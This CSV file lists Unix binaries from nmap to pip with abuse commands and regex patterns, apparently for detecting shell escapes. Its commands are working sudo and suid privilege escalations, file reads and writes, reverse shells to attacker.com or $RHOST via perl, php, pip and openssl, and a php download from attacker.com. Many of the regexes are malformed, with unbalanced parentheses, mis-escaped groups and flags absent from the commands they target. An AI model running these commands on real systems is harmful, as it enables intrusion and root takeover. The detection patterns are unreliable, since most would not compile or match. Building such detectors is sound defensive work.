Name,Function,ExampleCode,Regex
nmap,suid,./nmap -oG=$LFILE DATA,(?i)(?:sudo\s+)?(?:\S*/)?nmap\s+.*)
nohup,shell,"nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""",(?i)(?:sudo\s+)?(?:\S*/)?nohup\s*\-c\s+.*/bin/sh)
nohup,command,"nohup ""$COMMAND""
cat nohup.out",(?i)(?:sudo\s+)?(?:\S*/)?nohup\s+.*)
nohup,suid,"./nohup /bin/sh -p -c ""sh -p <$(tty) >$(tty) 2>$(tty)""",(?i)(?:sudo\s+)?(?:\S*/)?nohup\s*\-p\s*\-c\s*\-p\s+.*/bin/sh)
nohup,sudo,"sudo nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""",(?i)(?:sudo\s+)?(?:\S*/)?nohup\s*\-c\s+.*/bin/sh)
npm,shell,npm exec /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?npm\s+.*/bin/sh)
npm,shell,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json
npm -C $TF i",(?i)(?:sudo\s+)?(?:\S*/)?npm\s*\-C\s+.*/bin/sh)
npm,sudo,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i",(?i)(?:sudo\s+)?(?:\S*/)?npm\s*\-C\s+.*/bin/sh)
nroff,file-read,nroff $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?nroff\s+.*)
nroff,shell,"echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
GROFF_BIN_PATH=$TF nroff",(?i)(?:sudo\s+)?(?:\S*/)?nroff\s+.*/bin/sh)
nroff,sudo,"echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
sudo GROFF_BIN_PATH=$TF nroff",(?i)(?:sudo\s+)?(?:\S*/)?nroff\s+.*/bin/sh)
nsenter,shell,nsenter /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?nsenter\s+.*/bin/sh)
nsenter,sudo,sudo nsenter /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?nsenter\s+.*/bin/sh)
ntpdate,file-read,ntpdate -a x -k $LFILE -d localhost,(?i)(?:sudo\s+)?(?:\S*/)?ntpdate\s*\-a\s*\-k\s*\-d\s+.*)
ntpdate,sudo,sudo ntpdate -a x -k $LFILE -d localhost,(?i)(?:sudo\s+)?(?:\S*/)?ntpdate\s*\-a\s*\-k\s*\-d\s+.*)
ntpdate,suid,./ntpdate -a x -k $LFILE -d localhost,(?i)(?:sudo\s+)?(?:\S*/)?ntpdate\s*\-a\s*\-k\s*\-d\s+.*)
octave,shell,"octave-cli --eval 'system(""/bin/sh"")'","(?i)(?:sudo\s+)?(?:\S*/)?octave\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
octave,file-write,"octave-cli --eval 'filename = ""file_to_write""; fid = fopen(filename, ""w""); fputs(fid, ""DATA""); fclose(fid);'",(?i)(?:sudo\s+)?(?:\S*/)?octave\s+.*)
octave,file-read,"octave-cli --eval 'format none; fid = fopen(""file_to_read""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'",(?i)(?:sudo\s+)?(?:\S*/)?octave\s+.*)
octave,sudo,"sudo octave-cli --eval 'system(""/bin/sh"")'","(?i)(?:sudo\s+)?(?:\S*/)?octave\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
octave,limited-suid,"./octave-cli --eval 'system(""/bin/sh"")'","(?i)(?:sudo\s+)?(?:\S*/)?octave\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
od,file-read,"od -An -c -w9999 ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?od\s*\-c\s+.*)
od,suid,"./od -An -c -w9999 ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?od\s*\-c\s+.*)
od,sudo,"sudo od -An -c -w9999 ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?od\s*\-c\s+.*)
openssl,reverse-shell,mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,(?i)(?:sudo\s+)?(?:\S*/)?openssl\s*\-i\s+.*/bin/sh)
openssl,file-upload,"openssl s_client -quiet -connect $RHOST:$RPORT < ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+.*)
openssl,file-download,"openssl s_client -quiet -connect $RHOST:$RPORT > ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+.*)
openssl,file-write,"echo DATA | openssl enc -out ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+.*)
openssl,file-write,"echo ""DATA"" > $TF
openssl enc -in ""$TF"" -out ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+.*)
openssl,file-read,"openssl enc -in ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+.*)
openssl,suid,mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,(?i)(?:sudo\s+)?(?:\S*/)?openssl\s*\-i\s+.*/bin/sh)
openssl,suid,"echo DATA | openssl enc -out ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+.*)
openssl,sudo,mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,(?i)(?:sudo\s+)?(?:\S*/)?openssl\s*\-i\s+.*/bin/sh)
openssl,library-load,openssl req -engine ./lib.so,(?i)(?:sudo\s+)?(?:\S*/)?openssl\s+.*)
openvpn,shell,openvpn --dev null --script-security 2 --up '/bin/sh -c sh',(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s*\-c\s+.*/bin/sh)
openvpn,file-read,"openvpn --config ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s+.*)
openvpn,suid,"./openvpn --dev null --script-security 2 --up '/bin/sh -p -c ""sh -p""'",(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s*\-p\s*\-c\s*\-p\s+.*/bin/sh)
openvpn,suid,"./openvpn --config ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s+.*)
openvpn,sudo,sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh',(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s*\-c\s+.*/bin/sh)
openvpn,sudo,"sudo openvpn --config ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?openvpn\s+.*)
openvt,sudo,"sudo openvt -- sh -c ""$COMMAND >$TF 2>&1""
cat $TF",(?i)(?:sudo\s+)?(?:\S*/)?openvt\s*\-c\s+.*)
opkg,sudo,sudo opkg install x_1.0_all.deb,(?i)(?:sudo\s+)?(?:\S*/)?opkg\s+.*)
pandoc,file-read,"pandoc -t plain ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-t\s+.*)
pandoc,file-write,"echo DATA | pandoc -t plain -o ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-t\s*\-o\s+.*)
pandoc,shell,"echo 'os.execute(""/bin/sh"")' >$TF
pandoc -L $TF /dev/null",(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-L\s+.*/bin/sh)
pandoc,suid,"echo DATA | ./pandoc -t plain -o ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-t\s*\-o\s+.*)
pandoc,limited-suid,"echo 'os.execute(""/bin/sh"")' >$TF
./pandoc -L $TF /dev/null",(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-L\s+.*/bin/sh)
pandoc,sudo,"echo 'os.execute(""/bin/sh"")' >$TF
sudo pandoc -L $TF /dev/null",(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-L\s+.*/bin/sh)
paste,file-read,paste $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?paste\s+.*)
paste,suid,paste $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?paste\s+.*)
paste,sudo,sudo paste $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?paste\s+.*)
pax,file-read,"pax -w ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?pax\s*\-w\s+.*)
pdb,shell,"echo 'import os; os.system(""/bin/sh"")' > $TF
pdb $TF
cont","(?i)(?:sudo\s+)?(?:\S*/)?pdb\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
pdb,sudo,"echo 'import os; os.system(""/bin/sh"")' > $TF
sudo pdb $TF
cont","(?i)(?:sudo\s+)?(?:\S*/)?pdb\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
pdflatex,shell,pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:sudo\s+)?(?:\S*/)?pdflatex\s+.*/bin/sh.*BEGIN)
pdflatex,file-read,"pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -",(?i)(?:sudo\s+)?(?:\S*/)?pdflatex\s+.*BEGIN)
pdflatex,sudo,"sudo pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -",(?i)(?:sudo\s+)?(?:\S*/)?pdflatex\s+.*BEGIN)
pdflatex,sudo,sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:sudo\s+)?(?:\S*/)?pdflatex\s+.*/bin/sh.*BEGIN)
pdflatex,limited-suid,./pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:sudo\s+)?(?:\S*/)?pdflatex\s+.*/bin/sh.*BEGIN)
pdftex,shell,pdftex --shell-escape '\write18{/bin/sh}\end',(?i)(?:sudo\s+)?(?:\S*/)?pdftex\s+.*/bin/sh)
pdftex,sudo,sudo pdftex --shell-escape '\write18{/bin/sh}\end',(?i)(?:sudo\s+)?(?:\S*/)?pdftex\s+.*/bin/sh)
pdftex,limited-suid,./pdftex --shell-escape '\write18{/bin/sh}\end',(?i)(?:sudo\s+)?(?:\S*/)?pdftex\s+.*/bin/sh)
perf,shell,perf stat /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?perf\s+.*/bin/sh)
perf,suid,./perf stat /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?perf\s*\-p\s+.*/bin/sh)
perf,sudo,sudo perf stat /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?perf\s+.*/bin/sh)
perl,shell,"perl -e 'exec ""/bin/sh"";'",(?i)(?:sudo\s+)?(?:\S*/)?perl\s*\-e\s+.*/bin/sh)
perl,file-read,perl -ne print $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?perl\s+.*)
perl,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
perl -e 'use Socket;$i=""$ENV{RHOST}"";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'","(?i)(?:sudo\s+)?(?:\S*/)?perl\s*\-e\s*\-i\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*socket)"
perl,suid,"./perl -e 'exec ""/bin/sh"";'",(?i)(?:sudo\s+)?(?:\S*/)?perl\s*\-e\s+.*/bin/sh)
perl,sudo,"sudo perl -e 'exec ""/bin/sh"";'",(?i)(?:sudo\s+)?(?:\S*/)?perl\s*\-e\s+.*/bin/sh)
perl,capabilities,"./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec ""/bin/sh"";'",(?i)(?:sudo\s+)?(?:\S*/)?perl\s*\-e\s+.*/bin/sh)
perlbug,shell,perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;',(?i)(?:sudo\s+)?(?:\S*/)?perlbug\s*\-s\s*\-r\s*\-c\s*\-e\s+.*/bin/sh)
perlbug,sudo,sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;',(?i)(?:sudo\s+)?(?:\S*/)?perlbug\s*\-s\s*\-r\s*\-c\s*\-e\s+.*/bin/sh)
pexec,shell,pexec /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?pexec\s+.*/bin/sh)
pexec,suid,./pexec /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?pexec\s*\-p\s+.*/bin/sh)
pexec,sudo,sudo pexec /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?pexec\s+.*/bin/sh)
pg,shell,"pg /etc/profile
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?pg\s+.*/bin/sh)
pg,file-read,pg file_to_read,(?i)(?:sudo\s+)?(?:\S*/)?pg\s+.*)
pg,sudo,"sudo pg /etc/profile
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?pg\s+.*/bin/sh)
pg,suid,./pg file_to_read,(?i)(?:sudo\s+)?(?:\S*/)?pg\s+.*)
php,shell,"export CMD=""/bin/sh""
php -r 'system(getenv(""CMD""));'","(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
php,shell,"export CMD=""/bin/sh""
php -r 'passthru(getenv(""CMD""));'","(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
php,shell,"export CMD=""/bin/sh""
php -r 'print(shell_exec(getenv(""CMD"")));'","(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
php,shell,"export CMD=""/bin/sh""
php -r '$r=array(); exec(getenv(""CMD""), $r); print(join(""\\n"",$r));'","(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
php,shell,"export CMD=""/bin/sh""
php -r '$h=@popen(getenv(""CMD""),""r""); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'","(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
php,command,"export CMD=""id""
php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(getenv(""CMD""), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'","(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+.*(?:proc_open|fsockopen)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+)).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\))"
php,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
php -r '$sock=fsockopen(getenv(""RHOST""),getenv(""RPORT""));exec(""/bin/sh -i <&3 >&3 2>&3"");'","(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s*\-i\s+.*(?:proc_open|fsockopen)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+)).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
php,file-upload,php -S $LHOST:$LPORT,(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-S\s+.*)
php,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
php -r '$c=file_get_contents(getenv(""URL""));file_put_contents(getenv(""LFILE""), $c);'","(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+.*file_get(?:_contents)?\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*file_put(?:_contents)?\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))(?:,\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+)))?\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\))"
php,suid,"./php -r ""pcntl_exec('/bin/sh', ['-p']);""","(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
php,sudo,"sudo php -r ""system('$CMD');""","(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\))"
php,capabilities,"./php -r ""posix_setuid(0); system('$CMD');""","(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+.*posix_set(?:uid|euid|gid)?\s*\(?:\s*\d+\s*\).*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\))"
php,file-read,"export LFILE=file_to_read
php -r 'readfile(getenv(""LFILE""));'","(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+.*readfile\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\))"
php,file-write,"export LFILE=file_to_write
php -r 'file_put_contents(getenv(""LFILE""), ""DATA"");'","(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+.*file_put(?:_contents)?\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))(?:,\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+)))?\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\))"
pic,file-read,pic $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?pic\s+.*)
pic,shell,"pic -U
.PS
sh X sh X",(?i)(?:sudo\s+)?(?:\S*/)?pic\s*\-U\s+.*)
pic,sudo,"sudo pic -U
.PS
sh X sh X",(?i)(?:sudo\s+)?(?:\S*/)?pic\s*\-U\s+.*)
pic,limited-suid,"./pic -U
.PS
sh X sh X",(?i)(?:sudo\s+)?(?:\S*/)?pic\s*\-U\s+.*)
pico,shell,"pico
^R^X
reset; sh 1>&0 2>&0",(?i)(?:sudo\s+)?(?:\S*/)?pico\s+.*)
pico,shell,"pico -s /bin/sh
/bin/sh
^T",(?i)(?:sudo\s+)?(?:\S*/)?pico\s*\-s\s+.*/bin/sh)
pico,file-write,"pico file_to_write
DATA
^O",(?i)(?:sudo\s+)?(?:\S*/)?pico\s+.*)
pico,file-read,pico file_to_read,(?i)(?:sudo\s+)?(?:\S*/)?pico\s+.*)
pico,limited-suid,"./pico -s /bin/sh
/bin/sh
^T",(?i)(?:sudo\s+)?(?:\S*/)?pico\s*\-s\s+.*/bin/sh)
pico,sudo,"sudo pico
^R^X
reset; sh 1>&0 2>&0",(?i)(?:sudo\s+)?(?:\S*/)?pico\s+.*)
pidstat,command,pidstat -e $COMMAND,(?i)(?:sudo\s+)?(?:\S*/)?pidstat\s*\-e\s+.*)
pidstat,sudo,sudo pidstat -e $COMMAND,(?i)(?:sudo\s+)?(?:\S*/)?pidstat\s*\-e\s+.*)
pidstat,suid,./pidstat -e $COMMAND,(?i)(?:sudo\s+)?(?:\S*/)?pidstat\s*\-e\s+.*)
pip,shell,"echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
pip install $TF",(?i)(?:sudo\s+)?(?:\S*/)?pip\s+.*/bin/sh)
pip,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' > $TF/setup.py
pip install $TF","(?i)(?:sudo\s+)?(?:\S*/)?pip\s*\-d\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*socket)"
